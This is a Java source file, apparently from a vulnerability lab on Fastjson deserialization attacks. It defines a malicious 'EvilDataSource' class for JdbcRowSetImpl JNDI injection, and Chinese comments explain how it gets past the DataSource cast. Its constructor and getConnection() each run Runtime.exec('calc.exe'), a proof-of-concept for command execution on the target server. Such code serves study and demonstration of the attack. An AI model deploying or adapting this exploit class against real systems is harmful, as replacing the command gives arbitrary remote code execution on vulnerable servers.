package com.govuln.fastjsonattack;

import javax.sql.DataSource;
import java.io.PrintWriter;
import java.sql.Connection;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

/**
 * 实现了 DataSource 接口的恶意类
 * 用于 JdbcRowSetImpl JNDI 注入
 * 
 * 原理：
 * JdbcRowSetImpl.connect() 期望从 JNDI lookup 获取 DataSource 对象
 * 如果返回的是 Reference，会尝试转换为 DataSource
 * 通过实现 DataSource 接口，可以让转换成功
 */
public class EvilDataSource implements DataSource {
    
    public EvilDataSource() {
        try {
            System.out.println("EvilDataSource 构造函数被调用！");
            Runtime.getRuntime().exec("calc.exe");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    @Override
    public Connection getConnection() throws SQLException {
        try {
            System.out.println("EvilDataSource.getConnection() 被调用！");
            Runtime.getRuntime().exec("calc.exe");
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
    
    @Override
    public Connection getConnection(String username, String password) throws SQLException {
        return getConnection();
    }
    
    @Override
    public PrintWriter getLogWriter() throws SQLException {
        return null;
    }
    
    @Override
    public void setLogWriter(PrintWriter out) throws SQLException {
    }
    
    @Override
    public void setLoginTimeout(int seconds) throws SQLException {
    }
    
    @Override
    public int getLoginTimeout() throws SQLException {
        return 0;
    }
    
    @Override
    public Logger getParentLogger() throws SQLFeatureNotSupportedException {
        return null;
    }
    
    @Override
    public <T> T unwrap(Class<T> iface) throws SQLException {
        return null;
    }
    
    @Override
    public boolean isWrapperFor(Class<?> iface) throws SQLException {
        return false;
    }
}


